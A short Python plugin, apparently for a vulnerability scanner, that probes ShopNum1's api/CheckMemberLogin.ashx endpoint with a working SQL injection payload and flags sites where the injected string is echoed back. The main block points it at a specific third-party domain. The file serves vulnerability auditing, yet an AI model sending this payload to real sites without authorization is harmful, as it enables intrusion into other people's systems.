#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__Author__ = Mr.R
#_PlugName_ = ShopNum1分销门户系统 api/CheckMemberLogin.ashx注入
#__Refer___ = http://www.wooyun.org/bugs/wooyun-2015-0146994


def assign(service, arg):
    if service == 'shopnum1':
        return True, arg


def audit(arg):
    payload = "api/CheckMemberLogin.ashx?UserID=0'%20and%20(CHAR(116)%2bCHAR(101)%2bCHAR(115)%2bCHAR(116))>0--&type=UserIsExist"
    target = arg + payload
    code, head, res, errcode, _ = curl.curl2(target)
    if code == 200 and "test" in res:
        security_hole('sql inj>>'+target)

if __name__ == '__main__':
    from dummy import *
    audit(assign('shopnum1', 'http://www.huasenwei.com/')[1])